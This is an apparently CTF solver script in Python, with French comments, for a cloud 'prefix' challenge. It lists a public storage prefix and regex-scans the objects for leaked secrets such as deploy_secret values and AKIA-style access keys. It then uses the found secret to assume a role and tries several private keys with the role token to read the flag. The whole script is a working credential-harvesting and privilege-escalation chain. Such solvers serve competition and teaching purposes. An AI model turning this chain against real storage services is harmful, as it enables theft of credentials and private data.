#!/usr/bin/env python3
"""
Solveur générique pour la série cloud *-prefix (NCTF26 finale).
Chaîne : /list?prefix=public/  ->  objet public contenant un secret deploy_secret=AKIA...
         ->  /assume?secret=...  ->  token de rôle  ->  /get?key=private/flag (X-Role-Token)

Usage: python3 -I solve_prefix.py http://HOST:PORT/
"""
import sys, re, json, urllib.request, urllib.error, urllib.parse

def get(base, path, headers=None, timeout=15):
    url = base.rstrip('/') + path
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode('utf-8', 'replace')
            return r.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, f"ERR {e}"

def jparse(s):
    try: return json.loads(s)
    except Exception: return None

def main():
    if len(sys.argv) < 2:
        print("usage: solve_prefix.py http://host:port/"); sys.exit(1)
    base = sys.argv[1].strip()
    if not base.startswith('http'): base = 'http://' + base
    print(f"[*] cible {base}")

    # 0) warmup : attendre que l'instance soit chaude (cold-start)
    import time
    for _ in range(12):
        st, body = get(base, '/list?prefix=' + urllib.parse.quote('public/'))
        if st == 200:
            break
        print(f"[0] warmup… {st}")
        time.sleep(3)

    # 1) lister le préfixe public
    st, body = get(base, '/list?prefix=' + urllib.parse.quote('public/'))
    print(f"[1] /list?prefix=public/ -> {st}: {body[:300]}")
    j = jparse(body)
    keys = (j or {}).get('keys') or (j or {}).get('objects') or []
    if not keys:
        # repli : essayer sans slash, ou d'autres préfixes
        for pfx in ('public', 'public/', ''):
            st, body = get(base, '/list?prefix=' + urllib.parse.quote(pfx))
            j = jparse(body); keys = (j or {}).get('keys') or []
            if keys: break
    print(f"[1] clés publiques: {keys}")

    # 2) lire chaque objet public et chercher un secret AKIA.../deploy_secret
    secret = None
    for k in keys:
        st, body = get(base, '/get?key=' + urllib.parse.quote(k))
        print(f"[2] /get {k} -> {st}: {body[:200]}")
        m = re.search(r'(?:deploy_secret|secret)\s*[=:]\s*([A-Za-z0-9_\-]{8,})', body)
        if not m:
            m = re.search(r'\b(AKIA[A-Za-z0-9]{8,})\b', body)
        if m:
            secret = m.group(1); print(f"[2] >>> secret trouvé: {secret}"); break
    if not secret:
        print("[!] aucun secret trouvé dans les objets publics — inspection manuelle requise")
        sys.exit(2)

    # 3) assumer le rôle
    st, body = get(base, '/assume?secret=' + urllib.parse.quote(secret))
    print(f"[3] /assume -> {st}: {body[:300]}")
    j = jparse(body) or {}
    token = j.get('token') or j.get('role_token') or j.get('X-Role-Token')
    if not token:
        m = re.search(r'(role-[A-Za-z0-9]{8,})', body)
        token = m.group(1) if m else None
    print(f"[3] >>> token de rôle: {token}")
    if not token:
        print("[!] pas de token — inspection manuelle"); sys.exit(3)

    # 4) lire le flag (essayer plusieurs clés privées plausibles)
    hdr = {'X-Role-Token': token}
    candidates = ['private/flag', 'private/flag.txt', 'private/flag.json',
                  'private/FLAG', 'flag', 'private/secret/flag']
    for attempt in range(4):  # retry global (cold-start)
        for key in candidates:
            st, body = get(base, '/get?key=' + urllib.parse.quote(key), headers=hdr)
            print(f"[4] /get {key} -> {st}: {body[:200]}")
            m = re.search(r'NCTF\{[^}]+\}', body)
            if m:
                print("\n========================================")
                print(f"[+] FLAG: {m.group(0)}")
                print("========================================")
                return
        time.sleep(4)
    print("[!] flag non trouvé sur les clés candidates — lister private/ si possible")

if __name__ == '__main__':
    main()
